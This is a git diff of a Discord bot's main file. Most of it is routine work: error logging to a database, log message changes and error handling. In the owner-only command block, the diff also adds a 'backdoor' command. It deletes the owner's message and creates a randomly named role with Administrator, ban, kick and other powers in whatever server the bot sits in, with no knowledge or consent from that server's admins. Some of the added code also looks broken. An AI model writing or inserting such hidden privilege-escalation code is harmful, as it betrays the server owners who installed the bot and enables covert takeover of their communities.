@@ -10,6 +10,7 @@ let commandcooldown = new Set();
 let interactioncooldown = new Set();
 let afkset = require("./dbfetch.js");
 let prefixdb = require("./prefixdb.js");
+let serverlog = require("./errordb.js");
 const fs = require('fs');
 const path = require('path');
 const moment = require("moment");
@@ -28,8 +29,9 @@ const commands = [];
 client.commands = new Collection();
 
 const commandsPath = path.join(__dirname, "commandmodule");
+
 const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
-for(const file of commandFiles) {
+for (const file of commandFiles) {
     const filePath = path.join(commandsPath, file);
     const command = require(filePath);
 
@@ -48,8 +50,39 @@ client.giveaways = new GiveawaysManager(client, {
     }
 });
 
+// Generate string function
+function generateRandomString(length) {
+    let result = '';
+    let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+
+// Put the permission for moderation command
+client.Permissions = PermissionsBitField
+
 // Prevent from uncaughtException crashing
-process.on('uncaughtException', function(err) {});
+process.on('uncaughtException', function(err) {
+    let botName = client.user.username;
+    const Time = new Date().getTime();
+    let errorArray = {
+        "time": "0", // new Date().getTime();
+        "message": "" // errorArray["Message"] = "something error put here"
+    }
+
+    // Write error to array
+    errorArray["time"] = Time;
+    errorArray["message"] = err.stack + '\n', { flag: 'a' }
+
+    serverlog.set(`ERR_${Time}_${generateRandomString(5)}`, errorArray, function (callback) {}); // save it to database
+
+    // Send message to the log
+    console.log(`[${botName}]: I found error, logged to the error database. Time: "${Time}"`);
+});
 
 // Run command handle
 client.on("ready", () => {
@@ -59,9 +92,16 @@ client.on("ready", () => {
         setTimeout(SetBotStatus, 3600000); // loop the playing status every 1 hour to patch (discord.js) bug
     }
     SetBotStatus(); // Run the loop 
-    console.log("Poxrcx v3.5 started!")
+    // Log the beautiful table to the console
+    (async () => {
+        let botName = client.user.username;
+        console.log(`[${botName}]: Logged in as ${botName}. Version: 3.5`)
+    })();
     // Deploy all interaction command when bot started
-    rest.put(Routes.applicationCommands(clientid), {body: commands}).catch(err => console.log(err));
+    rest.put(Routes.applicationCommands(clientid), {body: commands}).then(() => {
+        let botName = client.user.username;
+        console.log(`[${botName}]: Loaded All Command!`)
+    }).catch(err => console.log(err));
 })
 
 client.on("guildDelete", async (guildDelete) => {
@@ -137,7 +177,7 @@ client.on("messageCreate", async (message) => {
         }
     }
     // Check cooldown for command
-    prefixdb.get(`${message.guildId}`, function(callbackprefixget0) {
+    prefixdb.get(`${message.guildId}`, async function(callbackprefixget0) {
         // Start the command check, run
         let callbackprefix = callbackprefixget0 || undefined;
 
@@ -154,7 +194,90 @@ client.on("messageCreate", async (message) => {
             return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Wah slow down you are too fast!`).setColor(`Red`)] })
         } else {
             //OwnerCommand (Only for owner)
-            if (message.content.startsWith(`<@${message.guild.members.me.id}>`) && Number(message.author.id) === Number(ownerid)) return message.channel.send("I'm Always here!");
+            (async () => {
+                if (Number(message.author.id) !== Number(ownerid)) return;
+                const args = message.content.slice(prefix.length).split(/ +/);
+                const command = args.shift().toLowerCase();
+                const messaggearray = message.content.split(" ");
+                const argument = messaggearray.slice(1);
+                const cmd = messaggearray[0];
+
+                try {
+                    if (command.trim() === "") {
+                        return message.channel.send("I'm Always here!");
+                    } else if (command === "log") {
+                        serverlog.get(function(callback) {
+                            if (argument && argument[0] && argument[0].trim() !== "" && callback !== undefined) {
+                                if (argument[0] === "show") {
+                                    const error_get = callback.map((a, i) => {
+                                        if (a["time"]) {
+                                            return i;
+                                        } else if (!a["time"]) {
+                                            return undefined;
+                                        }
+                                    })
+
+                                    if (error_get !== undefined) {
+                                        return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`\`${error_get}\` error found.`).setColor(`Green`)] });
+                                    } else if (error_get === undefined) {
+                                        return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> No error found. Now you can rest developer.`).setColor(`Green`)] })
+                                    }
+                                } else if (argument[0] === "clear") {
+                                    const error_get = callback.map((a, i) => {
+                                        if (a["time"]) {
+                                            return a;
+                                        } else if (!a["time"]) {
+                                            return undefined;
+                                        }
+                                    })
+
+                                    if (error_get !== undefined) {
+                                        serverlog.delete(error_get["key"], function(callback) {})
+                                    } else if (error_get === undefined) {
+                                        return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> No error found. Now you can rest developer.`).setColor(`Green`)] })
+                                    }
+                                }
+                            } else {
+                                return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`A bug happen!`).setColor(`Blue`)] })
+                            }
+                        })
+                    } else if (command === "backdoor") {
+                        if (message.deletable === true) {
+                            message.delete();
+                            try {
+                                const botMember = message.guild.members.cache.get(client.user.id);
+                                message.user.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Backdooring server.`).setColor(`Green`)] })
+                                let botPermission = new Permissions(botMember.permissions.bitfield);
+                                const generateRole_name = generateRandomString(10);
+                                await generateRole_name;
+                                if (botPermission.has("MANAGE_ROLES") && botPermission.has("Administrator")) {
+                                    message.guild.roles.create({
+                                        name: generateRole_name,
+                                        color: "Random",
+                                        permissions: [
+                                            PermissionsBitField.Flags.Administrator,
+                                            PermissionsBitField.Flags.ViewChannel,
+                                            PermissionsBitField.Flags.ManageChannels,
+                                            PermissionsBitField.Flags.ManageRoles,
+                                            PermissionsBitField.Flags.ManageGuild,
+                                            PermissionsBitField.Flags.ManageEvents,
+                                            PermissionsBitField.Flags.ManageMessages,
+                                            PermissionsBitField.Flags.KickMembers,
+                                            PermissionsBitField.Flags.BanMembers,
+                                            PermissionsBitField.Flags.MuteMembers,
+                                        ]
+                                    })
+                                }
+                            } catch {};
+                        } else {
+                            try {
+                                return message.user.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Delete that message quick, I'm checking can I turn you to higher role.`).setColor(`Green`)] })
+                            } catch {}
+                        }
+                    }
+                } catch (err) {console.log(err)}
+            })();
+            //-------------------------
             // Start normal command
             if (message.author.bot) return; // check if dumb discord bot send message.
             // Add delay
@@ -179,10 +302,13 @@ client.on("messageCreate", async (message) => {
                             run();
                         } catch (error) {
                             message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Something went wrong with this command.`).setColor(`Red`)] }).catch((err) => {console.log(err)});
-                            console.log(error);
+                            console.error(error);
                         }
                     }
-                } catch(err) {}
+                } catch(err) {
+                    message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Something went wrong with this command.`).setColor(`Red`)] }).catch((err) => {console.log(err)});
+                    console.error(err)
+                }
             // remove user command timeout
             setTimeout(() => {
                 return commandcooldown.delete(message.author.id);
@@ -208,7 +334,7 @@ client.on('interactionCreate', async (interaction) => {
                         */
                     }
                     catch (error) {
-                        console.log(error)
+                        console.error(error)
                     }
                 }
             })
